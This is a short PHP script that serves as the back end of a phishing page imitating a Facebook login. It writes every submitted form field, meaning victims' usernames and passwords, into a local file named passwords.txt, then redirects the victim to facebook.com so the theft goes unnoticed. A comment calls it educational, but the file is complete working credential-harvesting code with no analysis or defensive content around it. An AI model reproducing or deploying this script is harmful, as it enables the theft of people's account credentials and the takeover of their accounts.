<?php

header("location: http://wwww.facebook.com"); //THIS TUTORIAL IS ONLY FOR EDUCATIONAL PURPOSES
$handle = fopen("passwords.txt","a");

foreach($_POST as $variable => $value)
{
	fwrite($handle,$variable);
	fwrite($handle,"=");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");

}
fwrite($handle, "----x------x------x-----x----");
fclose($handle);
exit;
?>